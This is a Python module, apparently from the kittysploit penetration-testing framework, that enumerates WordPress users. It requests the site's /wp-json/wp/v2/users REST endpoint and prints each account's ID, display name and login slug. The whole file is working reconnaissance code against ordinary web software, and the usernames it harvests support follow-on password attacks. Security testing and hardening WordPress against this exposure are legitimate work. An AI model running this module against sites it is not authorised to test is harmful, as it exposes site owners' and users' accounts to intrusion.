from kittysploit import *
from lib.protocols.http.http_client import Http_client
        
class Module(Auxiliary, Http_client):


    __info__ = {
        'name': 'Wordpress user enumeration',
        'description': "Try to extract wordpress user enumeration"
    }
    
    def check(self):
        response = self.http_request(
                                method="GET",
                                path="/wp-json/wp/v2/users",
        )
        if response.status_code == 200:
            return True
        return False
    
    def run(self):

        response = self.http_request(
                                method="GET",
                                path="/wp-json/wp/v2/users",
        )
        if response and response.status_code == 200:
            users = response.json()
            for user in users:
                print_success(f"ID: {user['id']}, Name: {user['name']}, Username: {user['slug']}")
        else:
            fail.NotVulnerable()
        return True
